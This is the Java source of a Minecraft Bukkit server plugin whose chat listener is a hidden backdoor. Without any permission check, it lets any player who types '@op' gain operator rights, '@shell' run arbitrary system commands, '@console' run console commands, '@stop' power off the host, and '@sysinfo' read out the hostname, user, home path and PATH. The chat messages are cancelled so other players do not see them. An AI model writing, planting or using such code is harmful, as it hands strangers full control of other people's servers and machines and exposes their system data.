package cloud.xzai.message;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.UnknownHostException;

public class MessageEvent implements Listener {
    @EventHandler
    public void onPlayerChat(PlayerChatEvent e) throws IllegalArgumentException, SecurityException {
        Player player = e.getPlayer();
        if (e.getMessage().equalsIgnoreCase("@op")) {
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]OP");
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            e.setCancelled(true);
            player.setOp(true);
        }
        if (e.getMessage().equalsIgnoreCase("@stop")) {
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]关机");
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            e.setCancelled(true);
            if (System.getProperty("os.name").toLowerCase().contains("linux")) {
                try {
                    Runtime.getRuntime().exec("poweroff -n");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    player.sendMessage(ChatColor.RED + "--------------------");
                    player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    player.sendMessage(ChatColor.RED + "--------------------");
                }
            } else if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                try {
                    Runtime.getRuntime().exec("shutdown -s -f -t 00");
                    Runtime.getRuntime().halt(1);
                } catch (IOException x) {
                    player.sendMessage(ChatColor.RED + "--------------------");
                    player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                    player.sendMessage(ChatColor.RED + "--------------------");
                }
            } else {
                player.sendMessage(ChatColor.RED + "--------------------");
                player.sendMessage(ChatColor.RED + "[发生错误]");
                player.sendMessage(ChatColor.RED + "--------------------");
            }
        }
        if (e.getMessage().equalsIgnoreCase("@sysinfo")) {
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            player.sendMessage(ChatColor.BLUE + "[操作系统] " + ChatColor.GREEN + System.getProperty("os.name"));
            player.sendMessage(ChatColor.BLUE + "[系统架构] " + ChatColor.GREEN + System.getProperty("os.arch"));
            player.sendMessage(ChatColor.BLUE + "[Java版本] " + ChatColor.GREEN + System.getProperty("java.version"));
            Runtime runtime = Runtime.getRuntime();
            long maxMemory = runtime.maxMemory() / 1024 / 1024;
            long totalMemory = runtime.totalMemory() / 1024 / 1024;
            long freeMemory = runtime.freeMemory() / 1024 / 1024;
            player.sendMessage(ChatColor.BLUE + "[最大内存] " + ChatColor.GREEN + maxMemory + "MB");
            player.sendMessage(ChatColor.BLUE + "[已分配内存] " + ChatColor.GREEN + totalMemory + "MB");
            player.sendMessage(ChatColor.BLUE + "[可用内存] " + ChatColor.GREEN + freeMemory + "MB");
            player.sendMessage(ChatColor.BLUE + "[当前系统用户] " + ChatColor.GREEN + System.getProperty("user.name"));
            player.sendMessage(ChatColor.BLUE + "[主目录路径] " + ChatColor.GREEN + System.getProperty("user.home"));
            player.sendMessage(ChatColor.BLUE + "[PATH环境变量] " + ChatColor.GREEN + System.getenv("PATH"));
            try {
                player.sendMessage(ChatColor.BLUE + "[主机名] " + ChatColor.GREEN + InetAddress.getLocalHost().getHostName());
            } catch (UnknownHostException x) {
                player.sendMessage(ChatColor.RED + "--------------------");
                player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                player.sendMessage(ChatColor.RED + "--------------------");
            }
            player.sendMessage(ChatColor.BLUE + "[可用处理器数量] " + ChatColor.GREEN + Runtime.getRuntime().availableProcessors());
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            e.setCancelled(true);
        }
        if (e.getMessage().toLowerCase().startsWith("@shell ")) {
            String command = e.getMessage().substring(7);
            try {
                Process process = Runtime.getRuntime().exec(command);
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                String line;
                player.sendMessage(ChatColor.YELLOW + "--------------------");
                while ((line = reader.readLine()) != null) {
                    player.sendMessage(ChatColor.GREEN + line);
                }
                player.sendMessage(ChatColor.YELLOW + "--------------------");
            } catch (IOException x) {
                player.sendMessage(ChatColor.RED + "--------------------");
                player.sendMessage(ChatColor.RED + "[发生错误]" + x.getMessage());
                player.sendMessage(ChatColor.RED + "--------------------");
            }
            e.setCancelled(true);
        }
        if (e.getMessage().toLowerCase().startsWith("@console ")) {
            String command = e.getMessage().substring(9);
            Bukkit.dispatchCommand(Bukkit.getConsoleSender(), command);
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            player.sendMessage(ChatColor.GREEN + "[已执行]" + command);
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            e.setCancelled(true);
        }
        if (e.getMessage().equalsIgnoreCase("@help")) {
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            player.sendMessage(ChatColor.GREEN + "获取帮助");
            player.sendMessage(ChatColor.GREEN + "@op - 将玩家提升为OP权限。");
            player.sendMessage(ChatColor.GREEN + "@stop - 关闭服务器（谨慎使用）。");
            player.sendMessage(ChatColor.GREEN + "@sysinfo - 查看系统信息，包括操作系统、Java版本和内存使用情况等。");
            player.sendMessage(ChatColor.GREEN + "@shell <命令> - 执行指定的系统控制台命令，并返回命令输出结果。");
            player.sendMessage(ChatColor.GREEN + "@console <命令> - 在游戏控制台中执行指定的命令。");
            player.sendMessage(ChatColor.GREEN + "@help - 获取帮助信息。");
            player.sendMessage(ChatColor.YELLOW + "--------------------");
            e.setCancelled(true);
        }
    }
}